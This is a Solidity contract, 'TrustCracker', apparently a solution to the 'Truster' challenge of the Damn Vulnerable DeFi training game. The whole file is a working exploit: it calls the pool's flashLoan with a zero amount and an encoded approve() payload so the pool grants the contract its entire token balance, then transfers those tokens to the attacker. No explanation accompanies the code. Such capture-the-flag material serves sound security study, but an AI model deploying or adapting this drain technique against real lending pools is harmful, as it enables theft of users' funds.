// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITrusterLenderPool{
    function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata) external;
}

contract TrustCracker {

    IERC20 public immutable token;
    ITrusterLenderPool public immutable pool;
    address attacker;

     

    constructor(address _damnTokenAddress, address _poolAddress) {
        token = IERC20(_damnTokenAddress);
        pool = ITrusterLenderPool(_poolAddress);
        attacker = msg.sender;
    }
  
    function drainPool() public {
        uint256 poolBalance = token.balanceOf(address(pool));
        bytes memory payload = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);
        pool.flashLoan(0, attacker, address(token), payload);
        token.transferFrom(address(pool), attacker, poolBalance);
    }
}
